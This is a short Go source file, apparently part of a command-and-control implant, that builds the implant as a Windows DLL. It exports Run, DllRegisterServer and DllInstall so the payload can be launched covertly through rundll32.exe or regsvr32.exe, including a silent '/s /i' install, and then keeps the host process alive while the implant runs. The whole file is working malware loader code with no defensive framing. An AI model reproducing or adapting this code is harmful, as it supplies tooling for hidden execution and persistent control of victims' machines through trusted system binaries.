//go:build dll

package main

import "C"

import "implant/core/app"

// runDLL DLL 载荷入口：以 DLL 形态运行 implant
func runDLL() {
	if _, ok := app.InitDLL(listenerType); !ok {
		return
	}
	runLoop()
}

// Run rundll32 入口: rundll32.exe payload.dll,Run
// 阻塞运行使宿主进程存活，implant 在其中持续工作。
//
//export Run
func Run(hwnd, hinst, lpszCmdLine, nCmdShow uintptr) {
	runDLL()
}

// DllRegisterServer regsvr32 入口: regsvr32.exe payload.dll
//
//export DllRegisterServer
func DllRegisterServer() uintptr {
	runDLL()
	return 0 // S_OK
}

// DllInstall regsvr32 /i 入口: regsvr32.exe /s /i payload.dll
//
//export DllInstall
func DllInstall(bInstall, pszCmdLine uintptr) uintptr {
	runDLL()
	return 0 // S_OK
}

func main() {}
